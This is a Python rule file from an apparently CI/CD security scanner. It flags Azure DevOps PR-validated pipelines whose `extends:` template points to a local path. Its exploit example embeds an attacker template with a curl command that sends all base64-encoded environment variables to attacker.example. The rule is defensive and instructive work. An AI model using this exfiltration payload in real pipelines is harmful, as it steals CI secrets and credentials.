"""ADO-019, `extends:` template on PR-validated pipeline points to local path."""
from __future__ import annotations

from typing import Any

from ...base import Finding, Severity
from ...rule import Rule

RULE = Rule(
    id="ADO-019",
    title="`extends:` template on PR-validated pipeline points to local path",
    severity=Severity.CRITICAL,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION", "ESF-S-PIN-DEPS"),
    cwe=("CWE-78",),
    recommendation=(
        "Pin the extends template to a protected repository ref "
        "(`template@ref`). Local templates in PR-validated pipelines "
        "can be poisoned by the PR author."
    ),
    docs_note=(
        "`extends: template: <local-file>` includes another YAML from "
        "the CURRENT repo. On PR validation builds, the repo content "
        "is the PR branch, letting the PR author swap the template "
        "body and inject arbitrary pipeline logic. Cross-repo templates "
        "(`template: foo.yml@my-repo`) are version-pinned and not "
        "affected."
    ),
    exploit_example=(
        "# Vulnerable: PR-validated pipeline extends a LOCAL template.\n"
        "trigger: none\n"
        "pr:\n"
        "  branches: { include: [main] }\n"
        "extends:\n"
        "  template: templates/standard-build.yml   # no @repo ref\n"
        "\n"
        "# Attack: a PR author edits ``templates/standard-build.yml``\n"
        "# in their branch to inject any pipeline body they want.\n"
        "# The PR-validation run materializes the PR branch first,\n"
        "# THEN evaluates ``extends:`` against that tree, so the\n"
        "# attacker's template body runs with the pipeline's service\n"
        "# connections in scope.\n"
        "#\n"
        "# In the PR's templates/standard-build.yml:\n"
        "#   jobs:\n"
        "#     - job: exfil\n"
        "#       steps:\n"
        "#         - bash: |\n"
        "#             curl https://attacker.example/x \\\n"
        "#               -d \"$(printenv | base64 -w0)\"\n"
        "#\n"
        "# No further trick needed, ``extends:`` is the gate and the\n"
        "# PR author controls what's behind it.\n"
        "\n"
        "# Safe: pin the template to a protected ref in a separate repo.\n"
        "resources:\n"
        "  repositories:\n"
        "    - repository: pipeline-templates\n"
        "      type: git\n"
        "      name: ProjectName/pipeline-templates\n"
        "      ref: refs/tags/v1.4.2     # immutable, signed tag\n"
        "extends:\n"
        "  template: templates/standard-build.yml@pipeline-templates"
    ),
)


def check(path: str, doc: dict[str, Any]) -> Finding:
    # Detect PR trigger (same logic as ADO-011).
    pr = doc.get("pr")
    on_pr = False
    if isinstance(pr, list) and pr:
        on_pr = True
    elif isinstance(pr, dict):
        on_pr = True
    elif isinstance(pr, str) and pr.lower() not in ("none", "false"):
        on_pr = True

    if not on_pr:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description="Pipeline does not declare PR validation.",
            recommendation="No action required.", passed=True,
        )

    # Check top-level extends: key.
    extends = doc.get("extends")
    if not isinstance(extends, dict):
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description="Pipeline does not use `extends:` templates.",
            recommendation="No action required.", passed=True,
        )

    template = extends.get("template")
    if not isinstance(template, str):
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description="Pipeline `extends:` has no `template:` value.",
            recommendation="No action required.", passed=True,
        )

    # A repo ref is indicated by '@' in the template string.
    local = "@" not in template
    passed = not local
    desc = (
        f"PR-validated pipeline `extends:` template references a "
        f"repo-pinned template (`{template}`)."
        if passed else
        f"PR-validated pipeline `extends:` template points to local "
        f"path `{template}`, a PR author can replace its contents."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
